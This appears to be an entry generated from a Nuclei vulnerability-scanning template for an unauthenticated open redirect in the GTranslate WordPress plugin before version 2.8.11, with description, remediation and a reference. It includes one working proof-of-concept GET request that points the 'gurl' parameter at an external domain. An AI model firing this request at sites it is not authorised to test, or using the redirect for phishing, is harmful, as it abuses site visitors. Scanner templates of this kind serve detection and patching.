# Nuclei Template: GTranslate < 2.8.11 - Open Redirect
**Template ID:** wp-gtranslate-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**CWE:** CWE-601
**Source:** Nuclei Template (`wp-gtranslate-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
The Translate WordPress with GTranslate WordPress plugin was affected by an Unauthenticated Open Redirect security vulnerability.

## Impact
Allows attackers to redirect to the malicious site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/gtranslate/url_addon/gtranslate.php?glang=en&gurl=/oast.me
```

## Remediation
Update GTranslate plugin to the fixed version 2.8.11

## References
- https://wpscan.com/vulnerability/d4da110e-4351-49b8-b7a1-8be24895d2fa/
